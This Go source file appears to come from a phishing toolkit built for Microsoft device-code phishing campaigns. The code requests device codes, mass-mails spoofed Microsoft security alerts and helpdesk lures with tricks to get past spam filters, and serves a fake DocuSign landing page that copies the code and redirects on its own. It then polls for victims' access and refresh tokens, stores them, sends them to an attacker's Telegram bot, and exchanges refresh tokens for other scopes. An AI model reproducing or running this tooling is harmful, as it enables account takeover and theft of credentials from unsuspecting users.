package core

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/smtp"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/x-tymus/x-tymus/log"
)

// Microsoft Office public client — no app registration required.
const (
	dcClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	dcScope    = "https://graph.microsoft.com/.default offline_access openid profile email"
)

// ─────────────────────────────────────────────────────────────────────────────
// Data structures
// ─────────────────────────────────────────────────────────────────────────────

// DCTarget is one victim in a campaign.
type DCTarget struct {
	ID              int
	CampaignID      int
	Email           string
	Tenant          string
	LandingToken            string // random hex — URL: /dc/<token>
	UserCode                string // code victim enters at microsoft.com/devicelogin
	VerificationURI         string
	VerificationURIComplete string // pre-built URL with code already appended
	ExpiresIn       int
	StartedAt       time.Time
	Status          string // pending | completed | declined | expired | error
	AccessToken     string
	RefreshToken    string
	IDToken         string
	mu              sync.Mutex
	deviceCode      string
	interval        int
}

// DCCampaign groups multiple targets sent in one bulk run.
type DCCampaign struct {
	ID        int
	Name      string
	Template  string // "security_alert" | "it_helpdesk" | "custom"
	CreatedAt time.Time
	Targets   []*DCTarget
}

var (
	dcMu        sync.Mutex
	dcCampaigns []*DCCampaign
	dcTargets   []*DCTarget // flat list for easy lookup by LandingToken
	dcNextCamp  = 1
	dcNextTgt   = 1
)

const dcStateFile = "dc_state.json"

// dcTargetJSON is a serialisable snapshot of DCTarget (no mutex / unexported fields).
type dcTargetJSON struct {
	ID                      int       `json:"id"`
	CampaignID              int       `json:"campaign_id"`
	Email                   string    `json:"email"`
	Tenant                  string    `json:"tenant"`
	LandingToken            string    `json:"landing_token"`
	UserCode                string    `json:"user_code"`
	VerificationURI         string    `json:"verification_uri"`
	VerificationURIComplete string    `json:"verification_uri_complete"`
	ExpiresIn               int       `json:"expires_in"`
	StartedAt               time.Time `json:"started_at"`
	Status                  string    `json:"status"`
	AccessToken             string    `json:"access_token"`
	RefreshToken            string    `json:"refresh_token"`
	IDToken                 string    `json:"id_token"`
	DeviceCode              string    `json:"device_code"`
	Interval                int       `json:"interval"`
}

// saveDCState writes all targets to dc_state.json. Must be called with dcMu held OR after locking.
func saveDCState() {
	dcMu.Lock()
	defer dcMu.Unlock()
	saveDCStateLocked()
}

func saveDCStateLocked() {
	var snap []dcTargetJSON
	for _, t := range dcTargets {
		t.mu.Lock()
		snap = append(snap, dcTargetJSON{
			ID:                      t.ID,
			CampaignID:              t.CampaignID,
			Email:                   t.Email,
			Tenant:                  t.Tenant,
			LandingToken:            t.LandingToken,
			UserCode:                t.UserCode,
			VerificationURI:         t.VerificationURI,
			VerificationURIComplete: t.VerificationURIComplete,
			ExpiresIn:               t.ExpiresIn,
			StartedAt:               t.StartedAt,
			Status:                  t.Status,
			AccessToken:             t.AccessToken,
			RefreshToken:            t.RefreshToken,
			IDToken:                 t.IDToken,
			DeviceCode:              t.deviceCode,
			Interval:                t.interval,
		})
		t.mu.Unlock()
	}
	b, _ := json.MarshalIndent(snap, "", "  ")
	err := os.WriteFile(dcStateFile, b, 0600)
	if err != nil {
		log.Error("dc: failed to save state to %s: %v", dcStateFile, err)
	} else {
		log.Info("dc: saved %d targets to %s", len(snap), dcStateFile)
	}
}

// LoadDCState loads dc_state.json on startup and restores targets.
// Targets that are still pending and not expired will resume polling.
func LoadDCState() {
	raw, err := os.ReadFile(dcStateFile)
	if err != nil {
		return // no saved state yet
	}
	var snap []dcTargetJSON
	if err := json.Unmarshal(raw, &snap); err != nil {
		log.Warning("dc_state.json parse error: %v", err)
		return
	}

	dcMu.Lock()
	for _, s := range snap {
		// avoid duplicate IDs on re-load
		dup := false
		for _, existing := range dcTargets {
			if existing.LandingToken == s.LandingToken {
				dup = true
				break
			}
		}
		if dup {
			continue
		}
		t := &DCTarget{
			ID:                      s.ID,
			CampaignID:              s.CampaignID,
			Email:                   s.Email,
			Tenant:                  s.Tenant,
			LandingToken:            s.LandingToken,
			UserCode:                s.UserCode,
			VerificationURI:         s.VerificationURI,
			VerificationURIComplete: s.VerificationURIComplete,
			ExpiresIn:               s.ExpiresIn,
			StartedAt:               s.StartedAt,
			Status:                  s.Status,
			AccessToken:             s.AccessToken,
			RefreshToken:            s.RefreshToken,
			IDToken:                 s.IDToken,
			deviceCode:              s.DeviceCode,
			interval:                s.Interval,
		}
		if t.ID >= dcNextTgt {
			dcNextTgt = t.ID + 1
		}
		dcTargets = append(dcTargets, t)

		// Resume polling if still pending and not expired
		if t.Status == "pending" {
			deadline := t.StartedAt.Add(time.Duration(t.ExpiresIn) * time.Second)
			if time.Now().Before(deadline) {
				go t.poll()
			} else {
				t.Status = "expired"
			}
		}
	}
	dcMu.Unlock()
	log.Info("dc: loaded %d targets from %s", len(snap), dcStateFile)
}

// GlobalDCCfg is set from main so the device code sender can reach SMTP config.
var GlobalDCCfg *Config

// ─────────────────────────────────────────────────────────────────────────────
// Public API
// ─────────────────────────────────────────────────────────────────────────────

// StartDeviceCode starts a single device code flow (terminal `dc start` command).
func StartDeviceCode(tenantOrEmail string) (*DCTarget, error) {
	tgt, err := newTarget(0, tenantOrEmail)
	if err != nil {
		return nil, err
	}
	dcMu.Lock()
	dcTargets = append(dcTargets, tgt)
	saveDCStateLocked()
	dcMu.Unlock()
	go tgt.poll()
	return tgt, nil
}

// LaunchCampaign starts a device code flow for every email in the list,
// sends each a phishing email via SMTP, and returns the campaign.
func LaunchCampaign(name, template string, emails []string) (*DCCampaign, error) {
	camp := &DCCampaign{
		Name:      name,
		Template:  template,
		CreatedAt: time.Now(),
	}

	dcMu.Lock()
	camp.ID = dcNextCamp
	dcNextCamp++
	dcCampaigns = append(dcCampaigns, camp)
	dcMu.Unlock()

	var errs []string
	for _, email := range emails {
		email = strings.TrimSpace(email)
		if email == "" || !strings.Contains(email, "@") {
			continue
		}
		tgt, err := newTarget(camp.ID, email)
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", email, err))
			continue
		}
		dcMu.Lock()
		camp.Targets = append(camp.Targets, tgt)
		dcTargets = append(dcTargets, tgt)
		saveDCStateLocked()
		dcMu.Unlock()

		go tgt.poll()
		// Send phishing email (non-fatal if SMTP not configured)
		go func(t *DCTarget) {
			if err := sendDCEmail(t, template); err != nil {
				log.Error("dc campaign [%d] email to %s: %v", camp.ID, t.Email, err)
			}
		}(tgt)
	}

	if len(errs) > 0 {
		log.Warning("dc campaign [%d]: %d errors: %s", camp.ID, len(errs), strings.Join(errs, "; "))
	}
	return camp, nil
}

// GetCampaigns returns all campaigns.
func GetCampaigns() []*DCCampaign {
	dcMu.Lock()
	defer dcMu.Unlock()
	out := make([]*DCCampaign, len(dcCampaigns))
	copy(out, dcCampaigns)
	return out
}

// GetDCTargets returns all targets (across all campaigns + standalone).
func GetDCTargets() []*DCTarget {
	dcMu.Lock()
	defer dcMu.Unlock()
	out := make([]*DCTarget, len(dcTargets))
	copy(out, dcTargets)
	return out
}

// GetTargetByToken returns the DCTarget for a landing page token.
func GetTargetByToken(token string) *DCTarget {
	dcMu.Lock()
	defer dcMu.Unlock()
	for _, t := range dcTargets {
		if t.LandingToken == token {
			return t
		}
	}
	return nil
}

// ─────────────────────────────────────────────────────────────────────────────
// Internal helpers
// ─────────────────────────────────────────────────────────────────────────────

func newTarget(campaignID int, emailOrTenant string) (*DCTarget, error) {
	tenant := "common"
	email := ""
	if strings.Contains(emailOrTenant, "@") {
		email = emailOrTenant
		parts := strings.SplitN(emailOrTenant, "@", 2)
		tenant = parts[1]
	} else if emailOrTenant != "" {
		tenant = emailOrTenant
	}

	apiURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode", tenant)
	form := url.Values{}
	form.Set("client_id", dcClientID)
	form.Set("scope", dcScope)

	resp, err := http.PostForm(apiURL, form)
	if err != nil {
		return nil, fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var dc struct {
		DeviceCode              string `json:"device_code"`
		UserCode                string `json:"user_code"`
		VerificationURI         string `json:"verification_uri"`
		VerificationURIComplete string `json:"verification_uri_complete"`
		ExpiresIn               int    `json:"expires_in"`
		Interval                int    `json:"interval"`
		Error                   string `json:"error"`
		ErrorDesc               string `json:"error_description"`
	}
	if err := json.Unmarshal(body, &dc); err != nil {
		return nil, fmt.Errorf("bad response: %v", err)
	}
	if dc.Error != "" {
		return nil, fmt.Errorf("%s — %s", dc.Error, dc.ErrorDesc)
	}

	interval := dc.Interval
	if interval < 5 {
		interval = 5
	}

	token := randHex(16)

	dcMu.Lock()
	tgt := &DCTarget{
		ID:              dcNextTgt,
		CampaignID:      campaignID,
		Email:           email,
		Tenant:          tenant,
		LandingToken:    token,
		deviceCode:              dc.DeviceCode,
		UserCode:                dc.UserCode,
		VerificationURI:         dc.VerificationURI,
		VerificationURIComplete: dc.VerificationURIComplete,
		ExpiresIn:       dc.ExpiresIn,
		StartedAt:       time.Now(),
		Status:          "pending",
		interval:        interval,
	}
	dcNextTgt++
	dcMu.Unlock()
	return tgt, nil
}

func (s *DCTarget) poll() {
	apiURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", s.Tenant)
	deadline := s.StartedAt.Add(time.Duration(s.ExpiresIn) * time.Second)
	interval := s.interval

	for time.Now().Before(deadline) {
		time.Sleep(time.Duration(interval) * time.Second)

		form := url.Values{}
		form.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
		form.Set("device_code", s.deviceCode)
		form.Set("client_id", dcClientID)

		resp, err := http.PostForm(apiURL, form)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		var tok struct {
			AccessToken  string `json:"access_token"`
			RefreshToken string `json:"refresh_token"`
			IDToken      string `json:"id_token"`
			Error        string `json:"error"`
		}
		if err := json.Unmarshal(body, &tok); err != nil {
			continue
		}

		switch tok.Error {
		case "authorization_pending":
			// keep waiting
		case "slow_down":
			interval += 5
		case "authorization_declined":
			s.setStatus("declined")
			log.Warning("dc [#%d] %s: declined", s.ID, s.Email)
			return
		case "expired_token":
			s.setStatus("expired")
			log.Warning("dc [#%d] %s: expired", s.ID, s.Email)
			return
		case "":
			s.mu.Lock()
			s.Status = "completed"
			s.AccessToken = tok.AccessToken
			s.RefreshToken = tok.RefreshToken
			s.IDToken = tok.IDToken
			s.mu.Unlock()
			log.Success("dc [#%d] %s: TOKENS CAPTURED", s.ID, s.Email)
			log.Info("  access_token : %s...", trunc(tok.AccessToken, 60))
			log.Info("  refresh_token: %s...", trunc(tok.RefreshToken, 60))
			saveDCState()
			dcNotify(s)
			return
		default:
			s.setStatus("error")
			log.Error("dc [#%d] %s: %s", s.ID, s.Email, tok.Error)
			return
		}
	}
	s.setStatus("expired")
	log.Warning("dc [#%d] %s: expired (no auth)", s.ID, s.Email)
}

func (s *DCTarget) setStatus(st string) {
	s.mu.Lock()
	s.Status = st
	s.mu.Unlock()
	saveDCState()
}

func (s *DCTarget) GetStatus() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.Status
}

// ─────────────────────────────────────────────────────────────────────────────
// Telegram notification
// ─────────────────────────────────────────────────────────────────────────────

func dcNotify(s *DCTarget) {
	if GlobalBot == nil {
		return
	}
	adminID := GlobalBot.cfg.GetBotAdminChatId()
	if adminID == 0 {
		return
	}
	target := s.Email
	if target == "" {
		target = s.Tenant
	}
	msg := fmt.Sprintf(
		"🎯 *Device Code — Tokens Captured\\!*\n\n"+
			"📧 Target: `%s`\n"+
			"👤 Code: `%s`\n\n"+
			"🔑 *Access Token:*\n`%s`\n\n"+
			"♻️ *Refresh Token:*\n`%s`",
		tgEscape(target),
		tgEscape(s.UserCode),
		trunc(s.AccessToken, 200),
		trunc(s.RefreshToken, 200),
	)
	GlobalBot.send(adminID, msg)
}

// ─────────────────────────────────────────────────────────────────────────────
// SMTP email sender
// ─────────────────────────────────────────────────────────────────────────────

func sendDCEmail(t *DCTarget, template string) error {
	if GlobalDCCfg == nil {
		return fmt.Errorf("no config")
	}
	host := GlobalDCCfg.GetSmtpHost()
	port := GlobalDCCfg.GetSmtpPort()
	user := GlobalDCCfg.GetSmtpUser()
	pass := GlobalDCCfg.GetSmtpPass()
	from := GlobalDCCfg.GetSmtpFrom()

	if host == "" || t.Email == "" {
		return fmt.Errorf("smtp not configured or no email target")
	}
	if port == 0 {
		port = 587
	}
	if from == "" {
		from = user
	}

	// SMTP MAIL FROM envelope needs bare email only, not "Name <email>" format.
	// The From: header in the message body keeps the display name.
	envelopeFrom := extractEmail(from)
	// If envelopeFrom has no domain (e.g. user entered "bki-noreply" without @domain),
	// fall back to the SMTP username which must be a full address for Office365.
	if !strings.Contains(envelopeFrom, "@") {
		envelopeFrom = extractEmail(user)
	}
	if !strings.Contains(envelopeFrom, "@") {
		return fmt.Errorf("invalid sender address %q — set full email (user@domain.com) in SMTP config", envelopeFrom)
	}
	log.Info("smtp: sending to %s via %s from envelope=%s", t.Email, host, envelopeFrom)

	subject, body := buildEmailContent(t, template)

	// Build raw MIME message.
	// Date + Message-ID are required by RFC 5322 and improve inbox placement —
	// missing headers are a strong spam signal for Gmail / O365.
	msgIDDomain := envelopeFrom
	if at := strings.Index(envelopeFrom, "@"); at != -1 {
		msgIDDomain = envelopeFrom[at+1:]
	}
	msgID := fmt.Sprintf("<%s@%s>", randHex(16), msgIDDomain)
	dateStr := time.Now().Format("Mon, 02 Jan 2006 15:04:05 -0700")
	msg := fmt.Sprintf(
		"From: %s\r\nTo: %s\r\nSubject: %s\r\nDate: %s\r\nMessage-ID: %s\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n%s",
		from, t.Email, subject, dateStr, msgID, body)

	addr := fmt.Sprintf("%s:%d", host, port)

	// Microsoft (Outlook / Office365) requires AUTH LOGIN, not AUTH PLAIN.
	// All other hosts get PLAIN first; if that fails we retry with LOGIN.
	var auth smtp.Auth
	if strings.Contains(host, "outlook") || strings.Contains(host, "office365") || strings.Contains(host, "hotmail") {
		auth = newLoginAuth(user, pass)
	} else {
		auth = smtp.PlainAuth("", user, pass, host)
	}

	// Port 465 = implicit TLS (SSL), port 587 = STARTTLS
	if port == 465 {
		tlsCfg := &tls.Config{ServerName: host}
		conn, err := tls.Dial("tcp", addr, tlsCfg)
		if err != nil {
			return err
		}
		c, err := smtp.NewClient(conn, host)
		if err != nil {
			return err
		}
		defer c.Close()
		if err = c.Auth(auth); err != nil {
			// retry with LOGIN auth
			auth = newLoginAuth(user, pass)
			if err2 := c.Auth(auth); err2 != nil {
				return err
			}
		}
		if err = c.Mail(envelopeFrom); err != nil {
			return err
		}
		if err = c.Rcpt(t.Email); err != nil {
			return err
		}
		w, err := c.Data()
		if err != nil {
			return err
		}
		_, err = w.Write([]byte(msg))
		w.Close()
		return err
	}
	// STARTTLS (port 587 default)
	if err := smtp.SendMail(addr, auth, envelopeFrom, []string{t.Email}, []byte(msg)); err != nil {
		// retry with LOGIN auth if PLAIN was rejected
		auth = newLoginAuth(user, pass)
		return smtp.SendMail(addr, auth, envelopeFrom, []string{t.Email}, []byte(msg))
	}
	return nil
}

// extractEmail pulls the bare email address from "Display Name <email>" or returns as-is.
func extractEmail(from string) string {
	if i := strings.Index(from, "<"); i != -1 {
		if j := strings.Index(from[i:], ">"); j != -1 {
			return strings.TrimSpace(from[i+1 : i+j])
		}
	}
	return strings.TrimSpace(from)
}

// ─────────────────────────────────────────────────────────────────────────────
// Personalization engine — mirrors the Node sender's token system.
// Supports the same tokens (USER, DOMAIN, DOMC, DOMs, SILENTCODERS*) plus
// device-code specific ones (DCCODE, DCLINK, DCLANDING).
// ─────────────────────────────────────────────────────────────────────────────

func personalizeText(text, email string) string {
	parts := strings.SplitN(email, "@", 2)
	user := parts[0]
	domain := ""
	domainBase := ""
	if len(parts) == 2 {
		domain = parts[1]
		// base = first label before first dot (e.g. "gmail" from "gmail.com")
		domainBase = strings.SplitN(domain, ".", 2)[0]
	}
	domainCap := strings.ToUpper(domainBase[:1]) + domainBase[1:]

	r := strings.NewReplacer(
		"USER",                    user,
		"DOMAIN",                  domain,
		"DOMC",                    domainCap,
		"DOMs",                    domainBase,
		"SILENTCODERSEMAIL",       email,
		// URL-safe variant — use in href/src attributes to avoid raw "@" spam signals.
		// e.g. href="https://phish.com/?e=SILENTCODERSEMAILURL" → "...?e=user%40domain.com"
		"SILENTCODERSEMAILURL",    url.QueryEscape(email),
		"EMAILURLSILENTC0DERS",    dcB64(email),
		"SILENTCODERSLIMAHURUF",   dcRandStr(5, "alpha"),
		"SILENTCODERSBANYAKHURUF", dcRandStr(50, "alpha"),
		"SILENTCODERSNUMBER",      dcRandStr(6, "num"),
	)
	return r.Replace(text)
}

func personalizeForTarget(text string, t *DCTarget) string {
	verifyLink := t.verifyURL()
	landingURL := ""
	if GlobalDCCfg != nil {
		if h := GlobalDCCfg.GetDCLandingHost(); h != "" {
			landingURL = "https://" + h + "/dc/" + t.LandingToken
		}
	}
	if landingURL == "" {
		landingURL = verifyLink
	}
	// Append login_hint to the landing URL so the victim's email autofills on the MS login page.
	if t.Email != "" && !strings.Contains(landingURL, "login_hint") {
		sep := "?"
		if strings.Contains(landingURL, "?") {
			sep = "&"
		}
		landingURL += sep + "login_hint=" + url.QueryEscape(t.Email)
	}
	text = strings.ReplaceAll(text, "DCCODE",    t.UserCode)
	text = strings.ReplaceAll(text, "DCLINK",    verifyLink)
	text = strings.ReplaceAll(text, "DCLANDING", landingURL)
	if t.Email != "" {
		text = personalizeText(text, t.Email)
	}
	return text
}

// buildEmailContent returns subject + HTML body for a device code target.
// If letter.html exists in the working directory it is used as the template
// (same convention as the Node sender). Otherwise falls back to built-in templates.
func buildEmailContent(t *DCTarget, tmpl string) (subject, body string) {
	verifyLink := t.verifyURL()
	landingURL := ""
	if GlobalDCCfg != nil {
		if h := GlobalDCCfg.GetDCLandingHost(); h != "" {
			landingURL = "https://" + h + "/dc/" + t.LandingToken
		}
	}
	if landingURL == "" {
		landingURL = verifyLink
	}

	// ── External letter.html (same as Node sender) ──────────────────────────
	if raw, err := os.ReadFile("letter.html"); err == nil {
		body = personalizeForTarget(string(raw), t)
		// external subject from subject.txt if present, else default
		if subRaw, err2 := os.ReadFile("subject.txt"); err2 == nil {
			subject = personalizeForTarget(strings.TrimSpace(string(subRaw)), t)
		} else {
			subject = personalizeForTarget("Microsoft Security Alert: Action Required - USER", t)
		}
		return
	}

	// ── Built-in templates ───────────────────────────────────────────────────
	switch tmpl {
	case "it_helpdesk":
		subject = personalizeText("Action Required: Verify Your Identity — DOMC", t.Email)
		body = fmt.Sprintf(`<!DOCTYPE html><html><body style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
<div style="max-width:600px;margin:auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.1)">
<div style="background:#0078d4;padding:24px;text-align:center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" height="30" alt="Microsoft">
</div>
<div style="padding:32px">
  <h2 style="color:#1f1f1f;margin-top:0">Your IT team requires identity verification</h2>
  <p style="color:#444">We noticed unusual activity on your account and need to verify your identity before you can continue.</p>
  <p style="color:#444">Please complete the verification within <strong>15 minutes</strong>:</p>
  <div style="text-align:center;margin:28px 0">
    <div style="font-size:32px;font-weight:bold;letter-spacing:8px;color:#0078d4;background:#f0f7ff;border:2px dashed #0078d4;padding:16px 32px;display:inline-block;border-radius:6px">%s</div>
  </div>
  <div style="text-align:center;margin-bottom:24px">
    <a href="%s" style="background:#0078d4;color:#fff;padding:12px 28px;border-radius:4px;text-decoration:none;font-size:15px;display:inline-block">Verify Now &rarr;</a>
  </div>
  <p style="color:#777;font-size:12px">Or go to <a href="%s">%s</a> and enter the code above.</p>
  <hr style="border:none;border-top:1px solid #eee;margin:24px 0">
  <p style="color:#aaa;font-size:11px">If you did not request this, contact IT support immediately.</p>
</div></div></body></html>`, t.UserCode, landingURL, verifyLink, verifyLink)

	case "security_alert":
		fallthrough
	default:
		subject = personalizeText("Microsoft Security Alert: Sign-in Verification Required — SILENTCODERSNUMBER", t.Email)
		body = fmt.Sprintf(`<!DOCTYPE html><html><body style="font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;padding:20px;margin:0">
<div style="max-width:600px;margin:auto;background:#fff;border-radius:4px;overflow:hidden">
<div style="background:#0078d4;padding:20px 28px;display:flex;align-items:center;gap:12px">
  <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" height="24" alt="">
  <span style="color:#fff;font-size:14px;letter-spacing:.5px">Microsoft Account</span>
</div>
<div style="padding:36px 28px">
  <p style="color:#666;font-size:13px;margin-top:0">SECURITY NOTICE</p>
  <h1 style="font-size:22px;color:#1f1f1f;margin:0 0 16px;font-weight:600">Verify your sign-in</h1>
  <p style="color:#444;line-height:1.6">We detected a sign-in attempt to your account from a new device. To confirm it's you, please complete verification using the code below.</p>
  <div style="background:#f8f8f8;border-left:4px solid #0078d4;padding:16px 20px;margin:24px 0;border-radius:0 4px 4px 0">
    <p style="margin:0 0 4px;color:#666;font-size:12px;text-transform:uppercase;letter-spacing:.5px">Your verification code</p>
    <p style="margin:0;font-size:30px;font-weight:700;letter-spacing:6px;color:#0078d4">%s</p>
  </div>
  <p style="color:#555;font-size:13px">Enter this code at:</p>
  <p style="margin:4px 0 24px"><a href="%s" style="color:#0078d4;font-size:14px">%s</a></p>
  <div style="text-align:center;margin:20px 0">
    <a href="%s" style="background:#0078d4;color:#fff;padding:11px 32px;border-radius:2px;text-decoration:none;font-size:14px;font-weight:600">Complete Verification</a>
  </div>
  <hr style="border:none;border-top:1px solid #edebe9;margin:28px 0">
  <p style="color:#aaa;font-size:11px;line-height:1.5">This message was sent to %s. If you didn't initiate this, you can safely ignore this email.</p>
</div>
<div style="background:#f3f2f1;padding:12px 28px;text-align:center">
  <p style="color:#aaa;font-size:11px;margin:0">&copy; Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p>
</div>
</div></body></html>`, t.UserCode, verifyLink, verifyLink, landingURL, t.Email)
	}
	return
}

// dcRandStr generates a random string of given length and charset ("alpha" or "num").
func dcRandStr(n int, charset string) string {
	alpha := "abcdefghijklmnopqrstuvwxyz"
	num := "0123456789"
	chars := alpha + num
	if charset == "alpha" {
		chars = alpha
	} else if charset == "num" {
		chars = num
	}
	b := make([]byte, n)
	for i := range b {
		rb := make([]byte, 1)
		rand.Read(rb)
		b[i] = chars[int(rb[0])%len(chars)]
	}
	return string(b)
}

func dcB64(s string) string {
	return base64.URLEncoding.EncodeToString([]byte(s))
}

// RefreshForScope exchanges a FOCI refresh token for an access token scoped to
// the given resource. Returns the new access token and a fresh refresh token.
func RefreshForScope(rt, tenant, scope string) (accessToken, newRT string, err error) {
	if tenant == "" {
		tenant = "common"
	}
	apiURL := "https://login.microsoftonline.com/" + tenant + "/oauth2/v2.0/token"
	form := url.Values{}
	form.Set("client_id", dcClientID)
	form.Set("grant_type", "refresh_token")
	form.Set("refresh_token", rt)
	form.Set("scope", scope)

	resp, err := http.PostForm(apiURL, form)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var tok struct {
		AccessToken  string `json:"access_token"`
		RefreshToken string `json:"refresh_token"`
		Error        string `json:"error"`
		ErrorDesc    string `json:"error_description"`
	}
	if err := json.Unmarshal(body, &tok); err != nil {
		return "", "", fmt.Errorf("bad response: %v", err)
	}
	if tok.Error != "" {
		return "", "", fmt.Errorf("%s: %s", tok.Error, tok.ErrorDesc)
	}
	return tok.AccessToken, tok.RefreshToken, nil
}

// refreshForScopeWithClient is like RefreshForScope but lets the caller specify
// the client_id used in the token request. Using the target app's own client ID
// causes the returned token to carry appid == clientID, which some MSAL versions
// validate when looking up cached tokens.
func refreshForScopeWithClient(rt, tenant, clientID, scope string) (accessToken, newRT string, err error) {
	if tenant == "" {
		tenant = "common"
	}
	if clientID == "" {
		clientID = dcClientID
	}
	apiURL := "https://login.microsoftonline.com/" + tenant + "/oauth2/v2.0/token"
	form := url.Values{}
	form.Set("client_id", clientID)
	form.Set("grant_type", "refresh_token")
	form.Set("refresh_token", rt)
	form.Set("scope", scope)

	resp, err := http.PostForm(apiURL, form)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var tok struct {
		AccessToken  string `json:"access_token"`
		RefreshToken string `json:"refresh_token"`
		Error        string `json:"error"`
		ErrorDesc    string `json:"error_description"`
	}
	if err := json.Unmarshal(body, &tok); err != nil {
		return "", "", fmt.Errorf("bad response: %v", err)
	}
	if tok.Error != "" {
		return "", "", fmt.Errorf("%s: %s", tok.Error, tok.ErrorDesc)
	}
	return tok.AccessToken, tok.RefreshToken, nil
}

// verifyURL returns the HTML consent page URL with the user_code pre-filled.
//
// microsoft.com/devicelogin?code=XXX now server-redirects to the JSON API
// endpoint (deviceauth?code=XXX) which returns raw JSON in the browser.
// The correct user-facing HTML form is deviceauth?user_code=XXX — the code
// is pre-filled, victim sees "Sign in to Microsoft Office?" and clicks Yes.
func (t *DCTarget) verifyURL() string {
	return "https://login.microsoftonline.com/common/oauth2/deviceauth?user_code=" + url.QueryEscape(t.UserCode)
}

// ─────────────────────────────────────────────────────────────────────────────
// Landing page HTML — served at /dc/{token}
// Shows the code + a "Verify Now" button pointing to microsoft.com/devicelogin
// ─────────────────────────────────────────────────────────────────────────────

func DCLandingPage(t *DCTarget) string {
	deviceLoginURL := "https://microsoft.com/devicelogin"
	code := t.UserCode
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Document Pending Review</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Helvetica,Arial,sans-serif;background:#f4f4f4;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}
.wrap{width:100%%;max-width:520px}
/* domain banner */
.banner{background:#E8EFF6;color:#00083D;font-size:12px;text-align:center;padding:9px 20px;font-family:Helvetica,Arial,sans-serif}
/* logo row */
.logo-row{background:#fff;padding:20px 40px;display:flex;align-items:center;justify-content:center;gap:9px}
.logo-sq{background:#FFB800;border-radius:4px;width:34px;height:34px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#fff;flex-shrink:0}
.logo-text{font-size:22px;font-weight:700;color:#26282B;letter-spacing:-0.3px}
/* body */
.body{background:#260559;padding:28px 24px}
.eyebrow{font-size:11px;text-transform:uppercase;letter-spacing:1.2px;color:#c9b8e8;margin-bottom:8px}
h1{font-size:20px;font-weight:700;color:#fff;margin-bottom:18px;line-height:1.3}
.desc{color:#ddd;font-size:14px;line-height:1.7;margin-bottom:22px}
/* code box */
.code-box{background:#3a0c72;border:1px solid #6b3aa0;border-radius:6px;padding:16px 24px;text-align:center;margin-bottom:22px;cursor:pointer}
.code-label{font-size:10px;text-transform:uppercase;letter-spacing:1.5px;color:#c9a8f0;margin-bottom:8px}
.code{font-family:'Courier New',Courier,monospace;font-size:32px;font-weight:700;letter-spacing:10px;color:#fff;user-select:all}
.hint{font-size:12px;color:#bbb;text-align:center;margin-bottom:20px}
.hint-copied{font-size:12px;color:#a8e6a3;text-align:center;margin-bottom:20px;display:none}
/* CTA */
.cta-wrap{text-align:left;margin-bottom:22px}
.btn{display:inline-block;background:#fff;color:#260559;padding:11px 36px;border-radius:50px;font-size:14px;font-weight:700;text-decoration:none;cursor:pointer;border:none}
hr{border:0;border-top:0.5px solid #4a2a7a;margin:4px 0 16px}
.fine{font-size:13px;color:#fff;font-weight:700;margin-bottom:6px}
.fine2{font-size:12px;color:#bbb;line-height:1.5}
/* footer */
.footer{background:#E8EFF6;color:#00083D;font-size:12px;padding:18px 20px;line-height:1.5}
.footer a{color:#666}
</style>
</head>
<body>
<div class="wrap">
  <div class="banner" id="bdom">document.docusign.com</div>
  <div class="logo-row">
    <div class="logo-sq">d</div>
    <div class="logo-text">DocuSign</div>
  </div>
  <div class="body">
    <div class="eyebrow">Document Pending Review</div>
    <h1>One more step to access your document</h1>
    <p class="desc">Microsoft requires a quick identity check before you can view this document. Enter the code below at the Microsoft verification page.</p>
    <div class="code-box" id="cbox" onclick="doCopy()">
      <div class="code-label">Your verification code</div>
      <div class="code" id="code">%s</div>
    </div>
    <p class="hint" id="hint">Click the code above to copy it, then paste it on the Microsoft page.</p>
    <p class="hint-copied" id="copied">Copied — opening Microsoft verification…</p>
    <div class="cta-wrap">
      <a class="btn" href="%s" id="btn">Open Verification Page</a>
    </div>
    <hr>
    <p class="fine">Do Not Share This Email</p>
    <p class="fine2">To ensure the security of your data, do not share the links or forward this email to others.</p>
  </div>
  <div class="footer">
    <div>Processed on behalf of document.docusign.com</div>
  </div>
</div>
<script>
var code=%q,url=%q;
function doCopy(){
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(code).catch(function(){});
  } else {
    var t=document.createElement('textarea');
    t.value=code;t.style.position='fixed';t.style.opacity='0';
    document.body.appendChild(t);t.select();document.execCommand('copy');
    document.body.removeChild(t);
  }
  document.getElementById('hint').style.display='none';
  document.getElementById('copied').style.display='block';
}
document.getElementById('btn').addEventListener('click',function(e){
  e.preventDefault();doCopy();
  setTimeout(function(){window.location.replace(url);},700);
});
// Auto copy + redirect after 3s
setTimeout(function(){
  doCopy();
  setTimeout(function(){window.location.replace(url);},900);
},3000);
</script>
</body>
</html>`, code, deviceLoginURL, code, deviceLoginURL)
}

// ─────────────────────────────────────────────────────────────────────────────
// Utilities
